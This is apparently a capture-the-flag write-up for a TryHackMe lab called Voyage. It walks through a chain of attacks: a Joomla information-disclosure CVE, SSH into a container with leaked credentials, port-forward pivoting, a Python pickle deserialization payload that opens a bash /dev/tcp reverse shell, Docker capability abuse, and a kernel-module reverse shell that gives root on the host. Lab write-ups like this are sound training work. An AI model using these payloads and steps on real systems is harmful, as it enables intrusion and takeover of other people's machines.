📄 Complete Compromise Report — Voyage CTF (TryHackMe)

Author: Marwan
Date: December 2025

1. Introduction

During a practical offensive security assessment performed on a CTF training environment, multiple vulnerabilities were discovered and chained together to achieve a full compromise of the host machine (ROOT).
The attack leveraged misconfigurations, insecure components, and high‑risk vulnerabilities across several layers:

Joomla Information Disclosure (CVE‑2023‑23752)

Weak SSH configuration inside a Docker container

Internal network exposure enabling pivoting

Critical Python Pickle Insecure Deserialization

Dangerous Docker capabilities allowing container escape

Privilege escalation via malicious kernel module

This report documents the full kill‑chain from initial access to complete system takeover.

2. Reconnaissance

An initial scan was performed using Nmap:

nmap -sS -sV -vv -p- 10.201.23.116


Scan Results Summary

Port	Service	Notes
22	SSH	Standard host SSH
80	HTTP	Joomla CMS
2222	SSH	Likely inside a Docker container

The presence of a second SSH port suggested a containerized environment.

3. Joomla Exploitation — CVE‑2023‑23752

The Joomla vulnerability was exploited using:

python3 CVE-2023-23752.py -u 10.201.23.116 -o output.txt


Extracted Credentials

User: root
Password: RootPassword@1234
Database: joomla_db


These credentials successfully authenticated to SSH on port 2222, confirming access to a container, not the host.

ssh root@10.201.23.116 -p 2222

4. Internal Pivoting

Inside the container, an internal network 192.168.100.0/24 was discovered.

To reach an internal web application, local port forwarding was used:

ssh -L 5000:192.168.100.12:5000 -p 2222 root@10.201.23.116 -N


The internal service became accessible via:

http://127.0.0.1:5000

5. Insecure Deserialization — Python Pickle RCE

The web application responded with a suspicious cookie:

Set-Cookie: session_data=80049...


Analysis showed it was a Pickle-serialized object, which is inherently unsafe because loading it executes arbitrary code.

Decoded contents:

{'user': 'admin', 'revenue': '85000'}


This confirmed a critical Remote Code Execution (RCE) vulnerability.

6. Constructing a Pickle Reverse Shell Payload

A malicious Pickle payload was crafted:

class Exploit:
    def __reduce__(self):
        cmd = "bash -i >& /dev/tcp/10.201.19.199/4444 0>&1"
        return (subprocess.Popen, (["bash", "-c", cmd],))


The payload was injected into the session cookie.

Listener:

nc -lvnp 4444


A reverse shell was obtained inside another container.

7. Privilege Enumeration — Dangerous Container Capabilities

Using DeepCE:

./deepce.sh


The container had excessive capabilities:

cap_sys_module — Load kernel modules

cap_dac_override — Read any file

cap_net_raw — Sniff network packets

cap_sys_module alone is enough for a full host escape.

8. Container Escape → Host Machine Compromise

A malicious Linux Kernel Module (LKM) reverse shell was deployed.

Steps:

Upload rev.c + Makefile into the container

Compile:

make


Load the module:

insmod rev.ko


Listener:

nc -lvnp 1234


Result:

# whoami
root


The shell was now on the host, with full root privileges.

The final flag:

cd /root
cat root.txt

9. Summary of Exploitation Chain
Stage	Outcome
Joomla CVE‑2023‑23752	Credential leakage
SSH Access	Entry into container
Internal Pivoting	Access to private services
Pickle RCE	Remote Code Execution
Docker Capabilities Abuse	Container escape
Kernel Module Loading	Full root access on host

Final Impact:
🔥 CRITICAL — Full system compromise

Full root control

Read/write/delete any file

Persist backdoors

Complete system destruction possible (if production)